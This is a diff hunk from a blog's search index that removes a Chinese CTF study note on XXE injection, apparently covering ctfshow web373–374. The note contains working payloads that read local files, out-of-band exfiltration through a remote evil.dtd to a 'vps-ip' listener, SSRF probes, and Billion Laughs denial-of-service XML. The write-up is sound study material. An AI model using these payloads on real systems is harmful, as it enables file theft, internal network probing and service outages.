-<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>实例：</p>
-<p>DTD：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
-<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
-<p><img src="https://s2.loli.net/2023/12/20/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
-<p>实列：</p>
-<p>DTD：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
-<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
-<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>以下是代码的简要解释：</p>
-<ol>
-<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
-<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
-<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
-<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
-<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
-<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
-<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
-<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
-<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
-<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
-</ol>
-<p>贴个payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/03/11/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
-<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
-<p>以下为主要内容摘要：</p>
-<blockquote>
-<blockquote>
-<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
-</blockquote>
-<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
-<p>首先，找到问题出现的地方，问题出现在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
-
-<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
-</blockquote>
-<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>evil.dtd</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>解释：</p>
-<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
-<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
-<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
-<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
-<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
-<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
-<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
-<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
-<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>
-
-<p>我们的做法是将flag外带</p>
-<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
-<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
-<p><img src="https://s2.loli.net/2024/03/13/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
-<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>
-
-<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
-<p><img src="https://s2.loli.net/2024/03/13/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
-<p>此时</p>
-<p><img src="https://s2.loli.net/2024/03/13/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
-<p>说明8000端口启动http服务成功</p>
-<p>同理我们来测试1234端口：</p>
-<p><img src="https://s2.loli.net/2024/03/13/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
-<p>说明1234端口也启动http服务成功</p>
-<p>创建XXE.dtd文件并写入如下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>
-
-<p>在另一个页面监听本地1234端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/03/13/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
-<p>burp发包内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/03/13/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
-<p>在监听的页面就可以看到加密后的flag</p>
-<p><img src="https://s2.loli.net/2024/03/13/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
-<p>解密后得到flag</p>
-<p><img src="https://s2.loli.net/2024/03/13/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
-<p>对payload的解释：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>定义了两个实体：</p>
-<ol>
-<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
-</li>
-<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:1234/XXE.dtd</code>加载DTD文件。</p>
-</li>
-</ol>
-<p>以下是jay17师傅的解释（实体名有所改动）：</p>
-<ol>
-<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
-<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:1234/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
-<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
-<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
-<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
-</ol>
-<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
-<p>首先检测XML是否会被成功解析：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/12/20/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
-<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
-<p><img src="https://s2.loli.net/2023/12/20/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
-<p>接下来检测该端点是否支持DTD引用外部实体：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
-<p><img src="https://s2.loli.net/2023/12/20/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
-<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
-<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
-<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
-<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
-<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
-<p>之后便可使用以下语句尝试是否能够建立连接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
-<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
-<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
-<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>XXE</category>
-      </categories>
-      <tags>
-        <tag>XXE</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含学习记录</title>
     <url>/2024/03/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="认识是文件包含："><a href="#认识是文件包含：" class="headerlink" title="认识是文件包含："></a>认识是文件包含：</h2><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
@@ -923,148 +1065,6 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php反序列化学习记录</title>
-    <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
